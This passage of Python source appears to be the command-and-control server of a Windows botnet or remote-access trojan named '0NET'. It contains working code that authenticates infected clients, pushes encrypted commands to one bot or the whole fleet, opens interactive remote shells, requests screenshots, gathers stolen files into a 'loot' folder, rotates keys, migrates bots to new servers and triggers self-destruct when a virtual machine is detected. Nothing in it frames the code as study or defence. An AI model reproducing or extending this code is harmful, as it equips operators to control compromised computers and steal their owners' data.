        mode = self.headers.get("X-Key-Mode", "global")

        try:
            skew = abs(int(time.time() * 1000) - int(ts))
        except Exception:
            skew = None

        secs = self._secrets(did) if did else []
        ip_ok = self._ip_ok(did, ip) if did else True

        # a device with a secret is only let in on that secret. the fleet key is
        # bootstrap-only, plus a resync path for an enrolled device that must
        # come from the address it last authed from - it can't declare that.
        cands = []
        if secs:
            if mode == "secret":
                cands = [("secret", s) for s in secs]
            elif ip_ok:
                cands.append(("global", SERVER_ENCRYPTION_KEY_STR))
        else:
            cands.append(("global", SERVER_ENCRYPTION_KEY_STR))
            if OLD_ENCRYPTION_KEY_STR:
                cands.append(("old", OLD_ENCRYPTION_KEY_STR))

        for name, key in cands:
            if token_matches(ts, nonce, token, key):
                # clock is advisory only, a frozen or snapshot-restored box must
                # never be able to lock itself out
                if check_nonce(nonce):
                    self.key_mode = name
                    self.key_str = key
                    self.did = did
                    return True
                self._send(403)
                say("!", C.YEL, f"403 {self.path} replayed nonce · {ip} · did={did or '-'}")
                return False

        hint = {}
        fresh = self._mint(did)
        if fresh:
            hint["X-Enroll"] = fresh

        self._send(403, b"", hint)
        if hint:
            note = " · secret issued"
        elif secs and mode != "secret":
            note = (" · resync refused (address changed) — revoke this id"
                    if not ip_ok else " · resync key mismatch")
        elif secs:
            note = " · secret mismatch"
        else:
            note = " · id did not look like a device id"
        if skew is not None and skew > SKEW_WARN_MS:
            note += f" · clock skew {skew // 1000}s"
        say("!", C.YEL,
            f"403 {self.path} auth rejected · {ip} · did={did or '-'} mode={mode} "
            f"enrolled={'yes' if secs else 'no'}{note}")
        return False

    def _enroll_headers(self):
        out = {"X-Key-Mode": self.key_mode}
        if self.key_mode in ("global", "old") and self.did:
            with enrolled_lock:
                secs = enrolled.get(self.did)
                s = secs[-1] if secs else None
            if s is None:
                s = self._mint(self.did)
            if s:
                out["X-Enroll"] = s
        return out

    def do_GET(self):
        if self.path != "/":
            self._send(404)
            return
        ip = get_client_ip(self)
        if not rate_ok(ip):
            self._send(429)
            return
        try:
            if not self._auth():
                return

            ua = self.headers.get("User-Agent", "Unknown")
            did = generate_device_fingerprint_id(ua)
            osinfo = parse_os_from_user_agent(ua)

            claimed = self.headers.get("X-Client-ID")
            if claimed and claimed.upper() != did:
                self._send(403)
                say("!", C.YEL, f"403 fingerprint mismatch claimed={claimed} computed={did}")
                return

            with block_lock:
                blocked = did in blocked_ids or ip in blocked_ips
            if blocked:
                with pending_lock:
                    has = any(k in pending and pending[k] for k in (did, ip))
                if not has:
                    self._send(403, b"Blocked")
                    return

            is_new = touch_client(did, ip, osinfo)
            note_ip(did, ip)
            if is_new:
                say("+", C.GRN, f"{C.B}{did}{C.R} connected  {C.D}{ip} · {osinfo}{C.R}")
            sweep_stale()

            cmd = take_pending(did, ip)
            if cmd:
                say("·", C.D, f"→ {did}  {clean(cmd)}")

            if cmd and cmd.startswith("updatekey ") and broadcast_enc and cmd == broadcast_text:
                enc, sig = broadcast_enc, broadcast_mac
            elif cmd:
                enc = aes_encrypt(cmd, self.key_str)
                sig = mac_hex(enc, self.key_str)
            else:
                enc = ""
                sig = mac_hex("", self.key_str)

            extra = self._enroll_headers()
            extra["X-Signature"] = sig
            self._send(200, enc.encode("ascii"), extra)
        except Exception as e:
            say("x", C.RED, f"GET: {e}")
            self._send(500)

    def do_POST(self):
        if self.path == "/info":
            self._post_info()
        elif self.path == "/result":
            self._post_result()
        elif self.path == "/upload":
            self._post_upload()
        else:
            self._send(404)

    def _body_keys(self):
        out = []
        if self.key_str:
            out.append(self.key_str)
        if self.key_mode != "secret":
            if SERVER_ENCRYPTION_KEY_STR not in out:
                out.append(SERVER_ENCRYPTION_KEY_STR)
            if OLD_ENCRYPTION_KEY_STR and OLD_ENCRYPTION_KEY_STR not in out:
                out.append(OLD_ENCRYPTION_KEY_STR)
        return out

    def _read_verified(self):
        if not self._auth():
            return None
        enc_body = read_body(self)
        if enc_body is None:
            return None
        sig = self.headers.get("X-Signature", "")
        keys = self._body_keys()
        if not verify_mac(enc_body, sig, keys):
            say("!", C.YEL, f"403 bad signature ({self.path}) from {get_client_ip(self)} "
                            f"keymode={self.key_mode}")
            self._send(403, b"", self._enroll_headers())
            return None
        plain = None
        for k in keys:
            if hmac.compare_digest(sig, mac_hex(enc_body, k)):
                plain = decrypt_payload(enc_body, k)
                if plain is not None:
                    break
        if plain is None:
            say("!", C.YEL, f"403 undecryptable body ({self.path}) keymode={self.key_mode}")
            self._send(403, b"", self._enroll_headers())
            return None
        return plain

    def _known(self, cid, ip):
        with clients_lock:
            known = cid in clients and clients[cid]["ip"] == ip
        with enrolled_lock:
            known = known or bool(enrolled.get(cid))
        return known

    def _post_info(self):
        try:
            ip = get_client_ip(self)
            if not rate_ok(ip):
                self._send(429)
                return
            cid = (self.headers.get("X-Client-ID") or "").upper()
            if not cid:
                self._send(401)
                return
            plain = self._read_verified()
            if plain is None:
                return
            if not self._known(cid, ip):
                say("!", C.YEL, f"403 unknown sender on /info: {cid} @ {ip}")
                self._send(403)
                return

            cmd_id, _, info = plain.partition("\n")
            vm_hit = info.startswith("VM-DETECTED")
            nlines = len(info.rstrip("\n").split("\n"))
            fname = os.path.join(REPORT_DIR, f"{cid}_{safe_ip(ip)}_{int(time.time()*1000)}.txt")
            try:
                with open(fname, "w", encoding="utf-8") as f:
                    f.write(info)
                print()
                if vm_hit:
                    print(" " + tag("VM", C.BYELLOW) + " " + C.BOLD + cid + C.RESET + " "
                          + C.DIM + "·" + C.RESET + " " + C.DIM + ip + C.RESET)
                    print("  " + C.BYELLOW + info.split("\n", 1)[0] + C.RESET)
                    print("  " + C.DIM + "guard fired - persistence removed, self-destructed, "
                          + "will not return" + C.RESET)
                else:
                    print(" " + tag("INFO", C.BCYAN) + " " + C.BOLD + cid + C.RESET + " "
                          + C.DIM + "·" + C.RESET + " " + C.DIM + ip + C.RESET)
                print("  " + C.DIM + "saved to " + C.RESET + C.BWHITE + os.path.basename(fname)
                      + C.RESET + C.DIM + " (" + str(nlines) + " lines)" + C.RESET)
                print()
            except Exception as e:
                say("!", C.YEL, f"report save failed: {e}")

            _fire(cid, cmd_id)
            self._send(200, b"OK", self._enroll_headers())
        except Exception as e:
            say("x", C.RED, f"POST /info: {e}")
            self._send(500)

    def _post_result(self):
        try:
            ip = get_client_ip(self)
            if not rate_ok(ip):
                self._send(429)
                return
            cid = (self.headers.get("X-Client-ID") or "").upper()
            if not cid:
                self._send(401)
                return
            plain = self._read_verified()
            if plain is None:
                return
            if not self._known(cid, ip):
                say("!", C.YEL, f"403 unknown sender on /result: {cid} @ {ip}")
                self._send(403)
                return

            parts = plain.split("\n", 2)
            cmd_id  = parts[0] if len(parts) > 0 else ""
            command = parts[1] if len(parts) > 1 else ""
            output  = parts[2] if len(parts) > 2 else ""
            add_command_result(cid, command, output, cmd_id)
            self._send(200, b"OK", self._enroll_headers())
        except Exception as e:
            say("x", C.RED, f"POST /result: {e}")
            self._send(500)

    def _post_upload(self):
        try:
            ip = get_client_ip(self)
            if not rate_ok(ip):
                self._send(429)
                return
            cid = (self.headers.get("X-Client-ID") or "").upper()
            if not cid:
                self._send(401)
                return
            tid = self.headers.get("X-Tid", "")
            if not re.match(r'^[A-Za-z0-9]{1,24}$', tid):
                self._send(400)
                say("!", C.YEL, f"400 bad tid on /upload: {tid!r}")
                return
            try:
                idx = int(self.headers.get("X-Idx", "-1"))
                total = int(self.headers.get("X-Total", "-1"))
            except Exception:
                self._send(400)
                return
            if not (0 <= idx < total <= 100000):
                self._send(400)
                say("!", C.YEL, f"400 bad chunk range {idx}/{total}")
                return

            plain = self._read_verified()
            if plain is None:
                return
            if not self._known(cid, ip):
                say("!", C.YEL, f"403 unknown sender on /upload: {cid} @ {ip}")
                self._send(403)
                return

            _sweep_uploads()

            try:
                data = base64.b64decode(plain)
            except Exception:
                self._send(400)
                say("!", C.YEL, "400 bad base64 on /upload")
                return

            nb = self.headers.get("X-Name", "")
            try:
                name = base64.b64decode(nb).decode("utf-8", "replace") if nb else "file.bin"
            except Exception:
                name = "file.bin"
            name = os.path.basename(name.replace("\\", "/")).strip()
            name = re.sub(r'[<>:"|?*\x00-\x1f]', "_", name)
            if len(name) > MAX_NAME_LEN:
                name = name[:MAX_NAME_LEN]
            if name in ("", ".", ".."):
                name = "file.bin"

            # scratch dir per client: a broadcast shot hands the whole fleet the
            # same tid, so tid alone would have every bot overwrite 0.part
            d = os.path.join(UPLOAD_DIR, f"{tid}_{cid}")
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, f"{idx}.part"), "wb") as f:
                f.write(data)

            if all(os.path.exists(os.path.join(d, f"{i}.part")) for i in range(total)):
                out = os.path.join(LOOT_DIR, name)
                if os.path.exists(out):
                    stem, ext = os.path.splitext(name)
                    out = os.path.join(LOOT_DIR, f"{stem}_{int(time.time())}{ext}")
                with open(out, "wb") as w:
                    for i in range(total):
                        with open(os.path.join(d, f"{i}.part"), "rb") as r:
                            shutil.copyfileobj(r, w)
                shutil.rmtree(d, ignore_errors=True)
                print()
                print(" " + tag("LOOT", C.BGREEN) + " " + C.BOLD + cid + C.RESET + " "
                      + C.DIM + "·" + C.RESET + " " + C.BWHITE + os.path.basename(out) + C.RESET
                      + C.DIM + " (" + str(os.path.getsize(out)) + " bytes)" + C.RESET)
                print()

            self._send(200, b"OK", self._enroll_headers())
        except Exception as e:
            say("x", C.RED, f"POST /upload: {e}")
            self._send(500)

def _sweep_uploads():
    global _upload_sweep
    now = time.time()
    if now - _upload_sweep < 60.0:
        return
    _upload_sweep = now
    try:
        for n in os.listdir(UPLOAD_DIR):
            p = os.path.join(UPLOAD_DIR, n)
            try:
                if os.path.isdir(p) and now - os.path.getmtime(p) > UPLOAD_STALE_SEC:
                    shutil.rmtree(p, ignore_errors=True)
            except Exception:
                pass
    except Exception:
        pass

# --- results ---

def _fire(did, cmd_id):
    with pending_lock:
        ev = pending_events.get(did, {}).get(cmd_id)
        if ev:
            ev.set()

def add_command_result(target_id, command, output, cmd_id):
    body = clean(output.rstrip("\n")) or "(no output)"
    lines = body.split("\n")
    cut = False
    if len(lines) > MAX_PRINT_LINES:
        lines = lines[:MAX_PRINT_LINES]
        cut = True
    if len(body) > MAX_PRINT_CHARS:
        body = body[:MAX_PRINT_CHARS]
        lines = body.split("\n")
        cut = True
    if cut:
        lines.append("… truncated")

    ts = datetime.now().strftime("%H:%M:%S")
    with _PRINT:
        print()
        print(" " + tag("RESULT", C.BGREEN) + " " + C.BOLD + target_id + C.RESET + " "
              + C.DIM + "·" + C.RESET + " " + C.B + clean(command) + C.RESET
              + " " + C.D + ts + C.RESET)
        print(" " + C.D + ("─" * (get_width() - 2)) + C.RESET)
        for ln in lines:
            print("  " + ln)
        print(" " + C.D + ("─" * (get_width() - 2)) + C.RESET)
        print()
        sys.stdout.flush()

    try:
        d = os.path.join(REPORT_DIR, target_id)
        os.makedirs(d, exist_ok=True)
        p = os.path.join(d, datetime.now().strftime("%Y-%m-%d") + ".log")
        try:
            if os.path.getsize(p) > MAX_LOG_BYTES:
                os.replace(p, p + ".1")
        except Exception:
            pass
        with open(p, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().isoformat(timespec='seconds')}] {cmd_id} $ {command}\n{output}\n\n")
    except Exception:
        pass
    _fire(target_id, cmd_id)

# --- console ---

def banner(title, colour=C.CYAN):
    print()
    print(panel_top(title))
    print(panel_bottom())
    print()

def run_shell(entry):
    target_id = entry
    print()
    print(" " + tag("SHELL", C.BMAGENTA) + " " + C.BOLD + target_id + C.RESET)
    print(" " + C.DIM + "raw cmd commands · 'shell <ID>' switches target · 'exit' or Ctrl-C leaves" + C.RESET)
    print()
    with pending_lock:
        pending_events[target_id] = {}

    while True:
        try:
            with _PRINT:
                sys.stdout.write("  " + C.DIM + "shell " + C.MAG + target_id + C.RESET + C.DIM + " > " + C.RESET)
                sys.stdout.flush()
            line = input().strip()
        except (KeyboardInterrupt, EOFError):
            print()
            _leave_shell(target_id)
            return

        if line in ("exit", "quit", "quit()", "..", ":q", "bye", "logout"):
            _leave_shell(target_id)
            return
        if not line:
            continue

        sw = re.match(r'^shell\s+([A-Fa-f0-9:.]{2,45})$', line)
        if sw:
            newt = norm_target(sw.group(1))
            with clients_lock:
                ok = newt in clients
            if ok:
                enqueue(target_id, "shellquit")
                target_id = newt
                with pending_lock:
                    pending_events.setdefault(target_id, {})
                say("+", C.GRN, f"switched to {C.B}{target_id}{C.R}")
            else:
                say("!", C.YEL, f"client {newt} not connected")
            continue

        cid = new_id()
        ev = threading.Event()
        with pending_lock:
            pending_events.setdefault(target_id, {})[cid] = ev
        enqueue(target_id, f"shellcmd {line}", cid)
        try:
            if not ev.wait(timeout=SHELL_TIMEOUT):
                say("!", C.YEL, f"no response after {int(SHELL_TIMEOUT)}s")
        except KeyboardInterrupt:
            print()
            with pending_lock:
                pending_events.get(target_id, {}).pop(cid, None)
            _leave_shell(target_id)
            return
        with pending_lock:
            pending_events.get(target_id, {}).pop(cid, None)

def _leave_shell(target_id):
    enqueue(target_id, "shellquit")
    say("·", C.D, f"shell on {target_id} closed")
    with pending_lock:
        pending_events.pop(target_id, None)

def print_help():
    print()
    print(panel_top("commands"))
    print(panel_line())
    rows = (
        ("show", "list connected clients"),
        ("info", "pull full system info from everyone"),
        ("<ID|IP> <cmd>", "run a command on one client"),
        ("<cmd>", "broadcast a command to everyone"),
        ("\\<cmd>", "force broadcast even if reserved"),
        ("shell <ID>", "interactive shell on one client"),
        ("shot [ID]", "screenshot a client -> loot/"),
        ("sleep <sec> [ID]", "change poll interval"),
        ("remove <ID|IP>", "block + self-destruct"),
        ("unblock <ID|IP>", "lift a block"),
        ("revoke <ID>", "drop secret, force re-enroll"),
        ("setkey <key>", "rotate the fleet key"),
        ("updateserver <url>", "push a new server URL"),
        ("config", "show configuration"),
        ("log <ID> [n]", "tail a client's result log"),
        ("loot", "list received files"),
        ("clear", "clear the screen"),
    )
    for a, b in rows:
        print(panel_line(C.BCYAN + a.ljust(22) + C.RESET + "  " + C.WHITE + b + C.RESET))
    print(panel_line())
    print(panel_bottom())
    print()

def print_show():
    remove_stale_ips()
    with clients_lock:
        items = sorted(clients.items(), key=lambda kv: kv[1]["ts"], reverse=True)
    with enrolled_lock:
        enrolled_ids = set(enrolled.keys())
    with block_lock:
        bi = sorted(blocked_ids)
        bp = sorted(blocked_ips)

    print()
    print(panel_top("clients - " + str(len(items))))
    print(panel_line())
    if not items:
        print(panel_line(C.DIM + "(no clients online)" + C.RESET))
    else:
        for did, v in items:
            star = C.GRN + "*" + C.RESET if did in enrolled_ids else C.DIM + "·" + C.RESET
            print(panel_line(C.BGREEN + "●" + C.RESET + "  " + star + " "
                             + C.BOLD + C.BWHITE + did + C.RESET + "   "
                             + C.DIM + ago(v["ts"]) + C.RESET))
            print(panel_line("   " + C.DIM + v["ip"] + C.RESET + "  " + C.DIM + "·" + C.RESET
                             + "  " + C.WHITE + v["os"] + C.RESET))
    if bi or bp:
        print(panel_line())
        print(panel_divider("blocked"))
        if bi:
            print(panel_line(C.BRED + "ids" + C.RESET + "  " + C.DIM + ", ".join(bi) + C.RESET))
        if bp:
            print(panel_line(C.BRED + "ips" + C.RESET + "  " + C.DIM + ", ".join(bp) + C.RESET))
    print(panel_line())
    print(panel_bottom())
    print()

def print_config():
    with enrolled_lock:
        n_enrolled = len(enrolled)
    print()
    print(panel_top("configuration"))
    print(panel_line())
    print(panel_line(C.DIM + "bind".ljust(18) + C.RESET + C.WHITE
                     + f"{SERVER_BIND_ADDRESS}:{SERVER_PORT}" + C.RESET))
    print(panel_line(C.DIM + "key".ljust(18) + C.RESET + C.WHITE
                     + "*" * len(SERVER_ENCRYPTION_KEY_STR) + C.RESET
                     + C.DIM + f"  ({len(SERVER_ENCRYPTION_KEY_STR)} chars)" + C.RESET))
    if OLD_ENCRYPTION_KEY_STR:
        print(panel_line(C.DIM + "old key".ljust(18) + C.RESET + C.WHITE
                         + "*" * len(OLD_ENCRYPTION_KEY_STR) + C.RESET
                         + C.BYELLOW + "  (rotation active)" + C.RESET))
    print(panel_line(C.DIM + "cipher".ljust(18) + C.RESET + C.WHITE
                     + "AES-128-CBC · IV · HKDF-SHA256" + C.RESET))
    print(panel_line(C.DIM + "auth".ljust(18) + C.RESET + C.WHITE
                     + "HMAC token · single-use nonce" + C.RESET))
    print(panel_line(C.DIM + "nonce ttl".ljust(18) + C.RESET + C.WHITE
                     + str(int(NONCE_TTL // 86400)) + "d" + C.RESET))
    print(panel_line(C.DIM + "timestamp".ljust(18) + C.RESET + C.WHITE
                     + "advisory" + C.RESET))
    print(panel_line(C.DIM + "identity".ljust(18) + C.RESET + C.WHITE
                     + f"per-client secret ({n_enrolled} enrolled)" + C.RESET))
    print(panel_line(C.DIM + "resync".ljust(18) + C.RESET + C.WHITE
                     + "address-pinned" + C.RESET))
    print(panel_line(C.DIM + "proxy".ljust(18) + C.RESET + C.WHITE
                     + ("trusted + validated" if TRUST_PROXY_HEADERS else "ignored") + C.RESET))
    print(panel_line())
    print(panel_bottom())
    print()

def print_loot():
    files = sorted(os.listdir(LOOT_DIR))
    print()
    print(panel_top("loot - " + str(len(files))))
    print(panel_line())
    if not files:
        print(panel_line(C.DIM + "(empty)" + C.RESET))
    for f in files[-40:]:
        p = os.path.join(LOOT_DIR, f)
        try:
            sz = os.path.getsize(p)
        except Exception:
            sz = 0
        print(panel_line(C.WHITE + str(sz).rjust(10) + C.RESET + "  " + C.CYN + f + C.RESET))
    print(panel_line())
    print(panel_bottom())
    print()

def print_log(target, n):
    d = os.path.join(REPORT_DIR, target)
    if not os.path.isdir(d):
        say("!", C.YEL, f"no log for {target}")
        return
    logs = sorted(os.listdir(d))
    if not logs:
        say("!", C.YEL, f"no log for {target}")
        return
    print()
    print(panel_top("log · " + target))
    print(panel_line())
    with open(os.path.join(d, logs[-1]), "r", encoding="utf-8", errors="replace") as f:
        for ln in f.read().splitlines()[-n:]:
            print(panel_line(C.D + clean(ln) + C.RESET))
    print(panel_line())
    print(panel_bottom())
    print()

def console_thread():
    global SERVER_ENCRYPTION_KEY_STR, OLD_ENCRYPTION_KEY_STR

    while True:
        try:
            with _PRINT:
                sys.stdout.write(C.BCYAN + "> " + C.RESET)
                sys.stdout.flush()
            line = input().strip()
            if not line:
                continue
            low = line.lower()

            if low == "help":
                print_help()

            elif low == "show":
                print_show()

            elif low == "clear":
                sys.stdout.write("\033[2J\033[H")
                print_banner()

            elif low == "loot":
                print_loot()

            elif low == "config":
                print_config()

            elif low.startswith("setkey "):
                new_key = line[7:].strip()
                if not new_key:
                    say("x", C.RED, "key cannot be empty")
                else:
                    OLD_ENCRYPTION_KEY_STR = SERVER_ENCRYPTION_KEY_STR
                    SERVER_ENCRYPTION_KEY_STR = new_key
                    save_state(force=True)

                    cid  = new_id()
                    wire = f"updatekey {new_key} (ID-{cid})"
                    enc  = aes_encrypt(wire, OLD_ENCRYPTION_KEY_STR)
                    sig  = mac_hex(enc, OLD_ENCRYPTION_KEY_STR)
                    set_broadcast(wire, enc, sig, ttl=KEY_GRACE_SEC)
                    enqueue_all(f"updatekey {new_key}", cid)
                    say("+", C.GRN, f"key rotated · old key valid {int(KEY_GRACE_SEC)}s · "
                                    f"re-broadcast for {int(KEY_GRACE_SEC)}s")

                    def _retire():
                        global OLD_ENCRYPTION_KEY_STR
                        time.sleep(KEY_GRACE_SEC)
                        OLD_ENCRYPTION_KEY_STR = ""
                        save_state(force=True)
                        say("·", C.D, "old key retired")
                    threading.Thread(target=_retire, daemon=True).start()

            elif low.startswith("updateserver "):
                url = line[13:].strip()
                if url:
                    cid = new_id()
                    set_broadcast(f"updateserver {url}", ttl=PENDING_TTL)
                    enqueue_all(f"updateserver {url}", cid)
                    say("+", C.GRN, f"clients told to use {C.B}{url}{C.R}")

            elif low == "info":
                cid = new_id()
                set_broadcast("info", ttl=PENDING_TTL)
                enqueue_all("info", cid)
                with clients_lock:
                    n = len(clients)
                say("+", C.GRN, f"info requested · {n} client(s) · {C.D}{cid}{C.R}")

            elif low.startswith("log "):
                parts = line.split()
                if len(parts) < 2:
                    say("!", C.YEL, "usage: log <ID> [lines]")
                    continue
                tgt = norm_target(parts[1])
                ln = 40
                if len(parts) > 2 and parts[2].isdigit():
                    ln = max(1, min(int(parts[2]), 500))
                print_log(tgt, ln)

            elif low.startswith("unblock "):
                t = norm_target(line[8:].strip())
                with block_lock:
                    hit = t in blocked_ips or t in blocked_ids
                    blocked_ips.discard(t)
                    blocked_ids.discard(t)
                save_state(force=True)
                say("+" if hit else "!", C.GRN if hit else C.YEL,
                    f"{t} unblocked" if hit else f"{t} was not blocked")

            elif low.startswith("revoke "):
                t = norm_target(line[7:].strip())
                with enrolled_lock:
                    hit = enrolled.pop(t, None)
                    enrolled_ip.pop(t, None)
                save_state(force=True)
                if hit:
                    enqueue(t, "forget")
                    say("+", C.GRN, f"{t} secret revoked · told it to re-enroll")
                else:
                    say("!", C.YEL, f"{t} not enrolled")

            elif low.startswith("remove "):
                t = norm_target(line[7:].strip())
                removed = block_client(t)
                save_state(force=True)
                if removed:
                    for ip, did in removed:
                        enqueue(did, "remove")
                        say("+", C.GRN, f"{did} removed and blocked · {C.D}{ip}{C.R}")
                else:
                    say("!", C.YEL, f"no active client with ID or IP: {t}")

            elif low.startswith("shot"):
                _, _, rest = line.partition(" ")
                tgt = norm_target(rest.strip()) if rest.strip() else "*"
                tid = new_id()
                enqueue(tgt, f"screenshot {tid}")
                say("+", C.GRN, f"screenshot requested · {tgt} · {C.D}{tid}{C.R}")

            elif low.startswith("sleep "):
                rest = line[6:].strip()
                parts = rest.split()
                if not parts or not parts[0].isdigit():
                    say("!", C.YEL, "usage: sleep <seconds> [ID]")
                    continue
                secs = parts[0]
                tgt = norm_target(parts[1]) if len(parts) > 1 else "*"
                poll_hint[tgt] = int(secs)
                enqueue(tgt, f"sleep {secs}")
                say("+", C.GRN, f"{tgt} poll interval -> {secs}s")

            elif low.startswith("shell "):
                parts = line.split()
                if len(parts) < 2:
                    say("!", C.YEL, "usage: shell <deviceID>")
                    continue
                target_id = norm_target(parts[1])
                with clients_lock:
                    if target_id not in clients:
                        say("!", C.YEL, f"client {target_id} not connected")
                        continue
                run_shell(target_id)

            elif line.startswith("\\"):
                cmd = line[1:].strip()
                if not cmd:
                    continue
                cid = new_id()
                set_broadcast(cmd, ttl=PENDING_TTL)
                enqueue_all(cmd, cid)
                with clients_lock:
                    n = len(clients)
                say("+", C.GRN, f"broadcast {C.B}{clean(cmd)}{C.R} · {n} client(s) · {C.D}{cid}{C.R}")

            elif re.match(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[0-9A-Fa-f:]{2,45}|[A-Fa-f0-9]{6})\s', line):
                parts = line.split(maxsplit=1)
                target = norm_target(parts[0])
                cmd_text = parts[1]
                if not is_ip(target) and not re.match(r'^[A-F0-9]{6}$', target):
                    target = parts[0]
                enqueue(target, cmd_text)
                say("+", C.GRN, f"{target} ← {C.B}{clean(cmd_text)}{C.R}")

            else:
                cmd = line.strip()
                cid = new_id()
                set_broadcast(cmd, ttl=PENDING_TTL)
                enqueue_all(cmd, cid)
                with clients_lock:
                    n = len(clients)
                say("+", C.GRN, f"broadcast {C.B}{clean(cmd)}{C.R} · {n} client(s) · {C.D}{cid}{C.R}")

        except KeyboardInterrupt:
            print()
        except EOFError:
            print()
            break
        except Exception as e:
            say("x", C.RED, f"console: {e}")

# --- main ---

class ReuseTCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True
    request_queue_size = 128

_conn_sem = threading.BoundedSemaphore(MAX_CONN)

class Handler(RequestHandler):
    def setup(self):
        _conn_sem.acquire()
        try:
            super().setup()
        except Exception:
            _conn_sem.release()
            raise

    def finish(self):
        try:
            super().finish()
        finally:
            _conn_sem.release()

def print_banner():
    print()
    print(panel_top())
    print(panel_blank())
    print(panel_center("0NET Windows", C.BOLD + C.BWHITE + "0NET" + C.RESET + " " + C.WHITE + "Windows" + C.RESET))
    print(panel_center("", C.DIM + "" + C.RESET))
    print(panel_blank())
    print(panel_bottom())
    print()

def main():
    _save_tty()
    load_state()
    print_banner()
    print("  " + C.DIM + "key" + C.RESET + "        " + C.WHITE + "*" * len(SERVER_ENCRYPTION_KEY_STR) + C.RESET)
    print("  " + C.DIM + "listening" + C.RESET + "  " + C.WHITE
          + f"http://{SERVER_BIND_ADDRESS}:{SERVER_PORT}" + C.RESET)
    print("  " + C.DIM + "type" + C.RESET + " " + C.BCYAN + "help" + C.RESET
          + " " + C.DIM + "for commands" + C.RESET)
    print()

    threading.Thread(target=console_thread, daemon=True).start()

    try:
        with ReuseTCPServer((SERVER_BIND_ADDRESS, SERVER_PORT), Handler) as httpd:
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                print(f"\n  {C.YEL}shutting down{C.R}")
    finally:
        # console thread is a daemon parked in input(); hand the tty its attrs
        # back or the shell is left with echo off
        _write_state()
        restore_tty()
        try:
            sys.stdout.flush()
        except Exception:
            pass
    os._exit(0)

if __name__ == "__main__":
    main()
